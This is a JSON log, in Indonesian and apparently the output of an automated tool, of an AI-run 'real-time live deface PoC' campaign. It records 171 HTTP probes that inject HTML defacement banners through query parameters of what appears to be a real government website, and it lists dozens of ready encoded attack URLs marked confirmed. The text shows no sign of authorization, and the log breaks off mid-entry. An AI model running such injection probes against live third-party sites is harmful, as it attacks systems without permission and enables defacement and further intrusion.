@@ -1,0 +1,759 @@
+{
+  "module": "MODUL 52",
+  "title": "Real-Time Live Deface PoC Server Probing",
+  "status": "BERHASIL",
+  "summary": "AI mengeksekusi real-time deface PoC probing selama 300 detik (171 transaksi HTTP nyata). Terdeteksi 82 refleksi struktural di server target.",
+  "details": {
+    "real_time_deface_state": {
+      "attack_duration_seconds": 300,
+      "live_deface_probes": 171,
+      "live_deface_hits": [
+        {
+          "iteration": 1,
+          "parameter": "name",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?name=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 3,
+          "parameter": "search",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?search=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 5,
+          "parameter": "name",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?name=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 8,
+          "parameter": "name",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?name=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 12,
+          "parameter": "s",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?s=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 13,
+          "parameter": "action",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?action=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 14,
+          "parameter": "action",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?action=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 16,
+          "parameter": "s",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?s=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 17,
+          "parameter": "keyword",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?keyword=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 19,
+          "parameter": "page",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?page=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 20,
+          "parameter": "s",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?s=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 25,
+          "parameter": "id",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?id=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 26,
+          "parameter": "s",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?s=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 27,
+          "parameter": "action",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?action=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 28,
+          "parameter": "name",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?name=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 33,
+          "parameter": "page",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?page=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 34,
+          "parameter": "q",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?q=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 35,
+          "parameter": "name",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?name=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 36,
+          "parameter": "s",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?s=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 37,
+          "parameter": "name",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?name=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 38,
+          "parameter": "s",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?s=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 39,
+          "parameter": "keyword",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?keyword=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 40,
+          "parameter": "page",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?page=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 41,
+          "parameter": "page",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?page=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 44,
+          "parameter": "s",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?s=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 45,
+          "parameter": "page",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?page=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 48,
+          "parameter": "action",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?action=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 49,
+          "parameter": "q",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?q=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 51,
+          "parameter": "query",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?query=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 52,
+          "parameter": "keyword",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?keyword=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 56,
+          "parameter": "id",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?id=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 57,
+          "parameter": "search",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?search=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 60,
+          "parameter": "query",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?query=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 64,
+          "parameter": "q",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?q=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 65,
+          "parameter": "s",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?s=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 66,
+          "parameter": "query",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?query=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 67,
+          "parameter": "name",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?name=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 68,
+          "parameter": "name",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?name=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 69,
+          "parameter": "search",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?search=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 71,
+          "parameter": "action",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?action=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 74,
+          "parameter": "id",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?id=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 76,
+          "parameter": "action",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?action=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 81,
+          "parameter": "page",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?page=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 87,
+          "parameter": "keyword",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?keyword=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 88,
+          "parameter": "name",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?name=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 89,
+          "parameter": "query",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?query=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 90,
+          "parameter": "name",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?name=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 93,
+          "parameter": "action",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?action=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 96,
+          "parameter": "search",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?search=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 97,
+          "parameter": "action",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?action=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 98,
+          "parameter": "id",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?id=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 99,
+          "parameter": "id",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?id=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 101,
+          "parameter": "action",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?action=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 102,
+          "parameter": "s",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?s=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 103,
+          "parameter": "name",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?name=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 106,
+          "parameter": "page",
